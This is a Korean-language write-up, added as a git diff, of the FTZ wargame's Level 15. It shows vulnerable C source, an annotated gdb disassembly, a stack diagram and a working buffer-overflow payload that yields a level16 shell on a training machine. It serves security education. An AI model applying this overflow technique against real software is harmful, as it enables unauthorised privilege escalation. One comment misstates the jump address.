@@ -1,0 +1,168 @@
+@ Level-15 문제
+
+ - 아이디 : level15
+ - 패스워드 : guess what
+ - fgets : 입력 받은 문자열의 길이를 확인하지 않기 때문에 BoF에 취약함 함수
+
+
+1. 'attackme' 소스 코드
+
+[level15@ftz level15]$ cat hint
+
+#include <stdio.h>
+
+main()
+{ int crap;
+  int *check;
+  char buf[20];
+  fgets(buf,45,stdin);
+  if (*check==0xdeadbeef)
+   {
+     setreuid(3096,3096);
+     system("/bin/sh");
+   }
+}
+
+
+2. 'attackme' gdb 분석
+
+[level15@ftz level15]$ cp attackme tmp
+[level15@ftz level15]$ cd tmp
+[level15@ftz tmp]$ gdb -q attackme
+Reading symbols from /home/level15/tmp/attackme...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048490 <+0>:     push   %ebp
+   0x08048491 <+1>:     mov    %esp,%ebp
+ - 함수 프롤로그
+
+   0x08048493 <+3>:     sub    $0x38,%esp
+ - esp에서 0x38(56byte)만큼 공간을 확보한다.
+
+   0x08048496 <+6>:     sub    $0x4,%esp
+ - esp에서 0x4(4byte)만큼 공간을 확보한다.
+
+   0x08048499 <+9>:     pushl  0x8049664
+ - '0x8049664' 값을 스택에 Push 한다.
+ - 0x8049664 <stdin@@GLIBC_2.0>:    ""
+
+   0x0804849f <+15>:    push   $0x2d
+ - 0x2d(45)를 스택에 Push 한다.
+
+   0x080484a1 <+17>:    lea    -0x38(%ebp),%eax
+ - [ebp-0x38] 주소 값을 eax에 대입한다.
+ - [ebp-0x38]는 buf의 시작 주소이다.
+
+   0x080484a4 <+20>:    push   %eax
+ - eax 값을 스택에 Push 한다.
+
+   0x080484a5 <+21>:    call   0x8048360 <fgets@plt>
+ - fgets 함수를 호출한다.
+
+   0x080484aa <+26>:    add    $0x10,%esp
+ - esp에서 0x10(16byte) 만큼 공간을 제거한다.
+
+   0x080484ad <+29>:    mov    -0x10(%ebp),%eax
+ - [ebp-0x10]에 있는 값을 eax에 대입한다.
+
+   0x080484b0 <+32>:    cmpl   $0xdeadbeef,(%eax)
+   0x080484b6 <+38>:    jne    0x80484dd <main+77>
+ - '0xdeadbeef'와 [ebp-0x10]에 있는 값을 비교한다.
+ - [ebp-0x10]은 포인터 변수 check 시작 주소이다.
+
+	비교 연산 결과 값이 '0'인 경우, 다음 코드 진행
+	비교 연산 결과 값이 '0'이 아닌 경우, 0x80484db <main+75>로 점프 실시
+
+   0x080484b8 <+40>:    sub    $0x8,%esp
+ - esp에서 0x8(8byte)만큼 공간을 확보한다.
+
+   0x080484bb <+43>:    push   $0xc18
+ - 3096를 스택에 Push 한다.
+
+   0x080484c0 <+48>:    push   $0xc18
+ - 3096를 스택에 Push 한다.
+
+   0x080484c5 <+53>:    call   0x8048380 <setreuid@plt>
+ - setreuid 함수를 호출한다.
+
+   0x080484ca <+58>:    add    $0x10,%esp
+ - esp에서 0x10(16byte) 만큼 공간을 제거한다.
+
+   0x080484cd <+61>:    sub    $0xc,%esp
+sp에서 0xc(12byte)만큼 공간을 확보한다.
+
+   0x080484d0 <+64>:    push   $0x8048548
+ - '0x8048548' 값을 스택에 Push 한다.
+ - 0x8048548:       "/bin/sh"
+
+   0x080484d5 <+69>:    call   0x8048340 <system@plt>
+ - system 함수를 호출한다.
+
+   0x080484da <+74>:    add    $0x10,%esp
+ - esp에서 0x10(16byte) 만큼 공간을 제거한다.
+
+   0x080484dd <+77>:    leave
+   0x080484de <+78>:    ret
+ - 함수 에필로그
+
+End of assembler dump.
+(gdb) x/8x 0x080484b0
+0x80484b0 <main+32>:    0xbeef3881      0x2575dead      0x6808ec83      0x00000c18
+0x80484c0 <main+48>:    0x000c1868      0xfeb6e800      0xc483ffff      0x0cec8310
+
+(gdb) x/8x 0x080484b1
+0x80484b1 <main+33>:    0xadbeef38      0x832575de      0x186808ec      0x6800000c
+0x80484c1 <main+49>:    0x00000c18      0xfffeb6e8      0x10c483ff      0x680cec83
+
+(gdb) x/8x 0x080484b2
+0x80484b2 <main+34>:    0xdeadbeef      0xec832575      0x0c186808      0x18680000
+0x80484c2 <main+50>:    0xe800000c      0xfffffeb6      0x8310c483      0x48680cec
+
+(gdb) quit
+
+
+2. 스택 구조 그림
+
+[낮은 주소]
+		buf[20]	20byte
+		dummy	20byte
+		*check	4byte
+		crap	4byte
+		dummy	8byte
+		sfp	4byte
+		ret	4byte
+[높은 주소]
+
+
+3. BoF 공격
+
+ 1) BoF 공격 구조
+
+ - *check에 '0xdeadbeef' 값의 주소값(0x080484b2)을 삽입
+
+[낮은 주소]
+		buf[20]	20byte <- a * 20개
+		dummy	20byte <- a * 20개
+		check	4byte   <- '0xdeadbeef'
+		crap	4byte
+		dummy	8byte
+		sfp	4byte
+		ret	4byte
+[높은 주소]
+
+
+ 2) '0x080484b2' -> 리틀 엔디안 방식으로 변경
+
+0x080484b2	\xb2\x84\x04\x08
+
+
+ 3) 페이로드 제작
+
+"a"*40 + "\xb2\x84\x04\x08"
+
+[level15@ftz tmp]$ cd
+[level15@ftz level15]$ (python -c 'print("a"*40 + "\xb2\x84\x04\x08")';cat) | ./attackme
+id
+uid=3096(level16) gid=3095(level15) groups=3095(level15)
+
+my-pass
